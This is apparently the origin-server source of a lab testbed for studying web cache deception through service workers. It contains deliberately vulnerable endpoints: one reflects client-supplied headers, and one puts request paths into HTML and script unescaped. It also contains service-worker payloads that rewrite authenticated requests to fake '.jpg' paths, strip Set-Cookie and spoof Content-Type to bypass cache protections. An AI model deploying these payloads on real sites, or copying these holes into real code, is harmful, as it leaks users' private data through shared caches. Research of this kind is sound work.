import express from 'express';
import https from 'https';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { Pool } from 'pg';
import cors from 'cors';
import helmet from 'helmet';
import dotenv from 'dotenv';
import selfsigned from 'selfsigned';

import { getStrategy, validateStrategy } from './strategies.js';
import { createRateLimiter } from './middleware/rate-limiter.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

dotenv.config({ path: join(__dirname, '../.env') });


const app = express();
app.set('trust proxy', 1); // Trust the first proxy (Nginx)
const PORT = process.env.ORIGIN_PORT || 3443;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Database connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Required for SW registration in tests
      workerSrc: ["'self'", "blob:"], // Allow blob: for SW registration
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"]
    }
  },
  crossOriginEmbedderPolicy: false
}));

app.use(cors());
app.use(express.json());
// Tighten global rate limit for security testing: 10 requests per 60 seconds
app.use(createRateLimiter(60 * 1000, 5));

// Request logging middleware
app.use((req, res, next) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    method: req.method,
    path: req.path,
    query: req.query,
    headers: {
      'user-agent': req.headers['user-agent'],
      'accept': req.headers['accept'],
      'cookie': req.headers['cookie'] ? '***' : undefined
    },
    ip: req.ip
  };

  console.log('[ORIGIN]', JSON.stringify(logEntry));
  
  // Log to database
  pool.query(
    'INSERT INTO origin_logs (path, query_params, headers, ip_address) VALUES ($1, $2, $3, $4)',
    [req.path, JSON.stringify(req.query), JSON.stringify(logEntry.headers), req.ip]
  ).catch(err => console.error('DB log error:', err));

  next();
});

// Authentication simulation middleware
const simulateAuth = (req, res, next) => {
  const sessionCookie = req.headers.cookie?.match(/session=([^;]+)/)?.[1];
  
  if (sessionCookie) {
    req.user = {
      id: `user-${sessionCookie.split('-').pop()}`,
      session: sessionCookie,
      isAuthenticated: true
    };
  } else {
    req.user = {
      id: 'anonymous',
      session: null,
      isAuthenticated: false
    };
  }
  
  next();
};

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// FIXED: Proper path handling for all /account* variations
app.use('/account', simulateAuth, (req, res) => {
  const strategy = req.query.strategy || 'proper';
  
  try {
    validateStrategy(strategy);
    const headers = getStrategy(strategy);
    
    Object.entries(headers).forEach(([key, value]) => {
      res.set(key, value);
    });

    const marker = `marker-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    // HTML response that works for both /account and /account.jpg
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Account Dashboard - ${req.path}</title>
        <meta name="test-marker" content="${marker}">
      </head>
      <body>
        <h1>Account Dashboard</h1>
        <p><strong>Path:</strong> ${req.path}</p>
        <p><strong>Original URL:</strong> ${req.originalUrl}</p>
        <p><strong>Marker:</strong> <code id="marker">${marker}</code></p>
        <p><strong>Strategy:</strong> ${strategy}</p>
        <script>
          console.log('Account page loaded via path:', '${req.path}', 'Marker:', '${marker}');
          window.trialMarker = '${marker}';
        </script>
      </body>
      </html>
    `);

    // Log to database
    pool.query(
      'INSERT INTO origin_logs (path, strategy, marker, user_id, response_status) VALUES ($1, $2, $3, $4, $5)',
      [req.path, strategy, marker, req.user.id, 200]
    ).catch(err => console.error('DB log error:', err));

  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// FIXED: Proper API endpoint handling
app.use('/api/user', simulateAuth, (req, res) => {
  const strategy = req.query.strategy || 'proper';
  
  try {
    validateStrategy(strategy);
    const headers = getStrategy(strategy);
    
    Object.entries(headers).forEach(([key, value]) => {
      res.set(key, value);
    });

    const marker = `marker-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    res.json({
      user: req.user,
      path: req.path,
      strategy: strategy,
      marker: marker,
      timestamp: new Date().toISOString(),
      sensitiveData: req.user.isAuthenticated ? {
        email: `user-${req.user.id}@test.example.com`,
        profile: { ssn: '123-45-6789' }
      } : null
    });

  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// T2 Header Manipulation vulnerable endpoint
app.get('/api/reflect', simulateAuth, (req, res) => {
  // VULNERABILITY: Reflects custom headers (simulating header injection vuln)
  const reflectedHeaders = {};
  
  Object.keys(req.headers).forEach(key => {
    // Reflect X-Custom-* headers as actual headers
    if (key.toLowerCase().startsWith('x-custom-')) {
      const headerName = key.replace(/^x-custom-/i, '');
      reflectedHeaders[headerName] = req.headers[key];
      res.set(headerName, req.headers[key]);
    }
  });
  
  // Set security headers (but they might be overridden by reflected headers)
  res.set('Cache-Control', 'private, no-store');
  res.set('Content-Type', 'application/json');
  
  res.json({
    message: 'Header reflection test',
    reflectedHeaders: reflectedHeaders,
    originalHeaders: {
      'cache-control': req.headers['cache-control'],
      'surrogate-control': req.headers['surrogate-control']
    },
    user: req.user,
    marker: `marker-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
  });
});

// Service Worker hosting with scope control
app.get('/sw/:type', (req, res) => {
  const swType = req.params.type;
  const validTypes = ['t1-path-sculpting', 't2-header-manipulation', 't4-scope-misconfig'];
  
  if (!validTypes.includes(swType)) {
    return res.status(404).send('Service Worker not found');
  }

  // Critical: Allow broad scope for testing
  res.set({
    'Content-Type': 'application/javascript',
    'Service-Worker-Allowed': '/',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'X-Content-Type-Options': 'nosniff'
  });

  const swCode = `
    // ${swType} - Service Worker for SW-WCD Research
    console.log('[SW-WCD] ${swType} loaded');
    
    const STRATEGY = '${swType}';
    const MARKER_PREFIX = 'sw-wcd';
    
    self.addEventListener('install', (event) => {
      console.log('[SW-WCD] Installing:', STRATEGY);
      event.waitUntil(self.skipWaiting());
    });
    
    self.addEventListener('activate', (event) => {
      console.log('[SW-WCD] Activating:', STRATEGY);
      event.waitUntil(clients.claim());
    });
    
    ${getSWLogic(swType)}
    
    // Safety: Auto-unregister after 5 minutes
    setTimeout(() => {
      self.registration.unregister().then(() => {
        console.log('[SW-WCD] Safety: Auto-unregistered', STRATEGY);
      });
    }, 300000);
  `;

  res.send(swCode);
});

function getSWLogic(type) {
  switch (type) {
    case 't1-path-sculpting':
      return `
        self.addEventListener('fetch', (event) => {
          const url = new URL(event.request.url);
          
          // Target sensitive endpoints
          if (url.pathname === '/account' || url.pathname.startsWith('/api/user')) {
            console.log('[SW-WCD-T1] Intercepting:', url.pathname);
            
            // Rewrite URL with deceptive extension
            const deceptiveExtension = '.jpg';
            const deceptivePath = url.pathname + '/cache-bypass' + deceptiveExtension;
            const deceptiveURL = url.origin + deceptivePath + url.search;
            
            const modifiedRequest = new Request(deceptiveURL, {
              method: event.request.method,
              headers: event.request.headers,
              credentials: 'include', // CRITICAL: Preserve auth
              mode: 'cors',
              redirect: 'follow'
            });
            
            event.respondWith(
              fetch(modifiedRequest).then(response => {
                // Clone to modify headers
                const modifiedHeaders = new Headers(response.headers);
                
                // Remove Set-Cookie to allow CDN caching
                modifiedHeaders.delete('Set-Cookie');
                
                // Spoof Content-Type to bypass Cache Deception Armor
                modifiedHeaders.set('Content-Type', 'image/jpeg');
                modifiedHeaders.set('X-SW-Modified', 't1-path-sculpting');
                
                return new Response(response.body, {
                  status: response.status,
                  statusText: response.statusText,
                  headers: modifiedHeaders
                });
              }).catch(error => {
                console.error('[SW-WCD-T1] Fetch failed:', error);
                return fetch(event.request);
              })
            );
          }
        });
      `;
    
    case 't2-header-manipulation':
      return `
        self.addEventListener('fetch', (event) => {
          const url = new URL(event.request.url);
          
          if (url.pathname.startsWith('/api/')) {
            console.log('[SW-WCD-T2] Intercepting API request:', url.pathname);
            
            // Add header that might be reflected by origin
            const modifiedHeaders = new Headers(event.request.headers);
            modifiedHeaders.set('X-Custom-Surrogate-Control', 'max-age=3600');
            modifiedHeaders.set('X-CDN-Cache-Override', 'force-cache');
            
            const modifiedRequest = new Request(event.request, {
              headers: modifiedHeaders
            });
            
            event.respondWith(
              fetch(modifiedRequest).then(response => {
                const modifiedResponseHeaders = new Headers(response.headers);
                modifiedResponseHeaders.set('X-SW-Modified', 't2-header-manipulation');
                return new Response(response.body, {
                  status: response.status,
                  statusText: response.statusText,
                  headers: modifiedResponseHeaders
                });
              })
            );
          }
        });
      `;
    
    case 't4-scope-misconfig':
      return `
        self.addEventListener('fetch', (event) => {
          const url = new URL(event.request.url);
          
          // Map user-specific paths to shared cache path
          if (url.pathname.match(/^\\/user\\/[^\\/]+\\/profile$/)) {
            console.log('[SW-WCD-T4] Intercepting user profile:', url.pathname);
            
            const sharedCachePath = '/static/profile-cache';
            const sharedURL = url.origin + sharedCachePath + url.search;
            
            const modifiedRequest = new Request(sharedURL, {
              method: event.request.method,
              headers: event.request.headers,
              credentials: 'include',
              mode: 'cors'
            });
            
            event.respondWith(
              fetch(modifiedRequest).then(response => {
                const modifiedHeaders = new Headers(response.headers);
                modifiedHeaders.set('X-SW-Modified', 't4-scope-misconfig');
                modifiedHeaders.set('X-Shared-Cache-Path', sharedCachePath);
                return new Response(response.body, {
                  status: response.status,
                  statusText: response.statusText,
                  headers: modifiedHeaders
                });
              })
            );
          }
        });
      `;
    
    default:
      return `// Unknown SW type`;
  }
}

// Error handling
app.use((err, req, res, next) => {
  console.error('Origin server error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    message: NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

// SSL certificate configuration
function generateSSL() {
  // 1. Try to use the trusted mkcert certificates generated by 'npm run setup'
  try {
    const keyPath = join(__dirname, '../ssl/key.pem');
    const certPath = join(__dirname, '../ssl/cert.pem');

    // Check if files exist
    if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
      // Store a flag so we can log it later
      process.env.SSL_MODE = 'Trusted (mkcert)';
      return {
        key: fs.readFileSync(keyPath),
        cert: fs.readFileSync(certPath)
      };
    }
  } catch (err) {
    console.warn('⚠️ Could not load trusted SSL files from ../ssl/, falling back...');
  }

  // 2. Fallback: Generate temporary self-signed certs (Development only)
  // These will cause browser warnings!
  if (NODE_ENV === 'development') {
    process.env.SSL_MODE = 'Self-signed (Untrusted)';
    
    const attrs = [{ name: 'commonName', value: 'localhost' }];
    const options = {
      days: 365,
      keySize: 2048,
      extensions: [
        {
          name: 'subjectAltName',
          altNames: [
            { type: 2, value: 'localhost' },
            { type: 2, value: 'cdn-simulator.local' },
            { type: 2, value: '127.0.0.1' }
          ]
        }
      ]
    };
    
    const cert = selfsigned.generate(attrs, options);
    return {
      key: cert.private,
      cert: cert.cert
    };
  } else {
    // 3. Production - use Let's Encrypt (Example paths)
    process.env.SSL_MODE = 'Production';
    return {
      key: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/privkey.pem'),
      cert: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/fullchain.pem')
    };
  }
}

// Start server
const sslConfig = generateSSL();
const server = https.createServer(sslConfig, app);

server.listen(PORT, '0.0.0.0',() => {
  console.log(` Origin server running on https://localhost:${PORT}`);
  console.log(` Environment: ${NODE_ENV}`);
  console.log(` SSL Status: ${process.env.SSL_MODE || 'Unknown'}`);
  console.log(` Endpoints:`);
  console.log(`   - /account?strategy=proper|misconfigured|missing|conflicting`);
  console.log(`   - /api/user?strategy=...`);
  console.log(`   - /api/reflect (T2 header reflection)`);
  console.log(`   - /sw/t1-path-sculpting`);
  console.log(`   - /sw/t2-header-manipulation`);
  console.log(`   - /sw/t4-scope-misconfig`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    pool.end();
    process.exit(0);
  });
});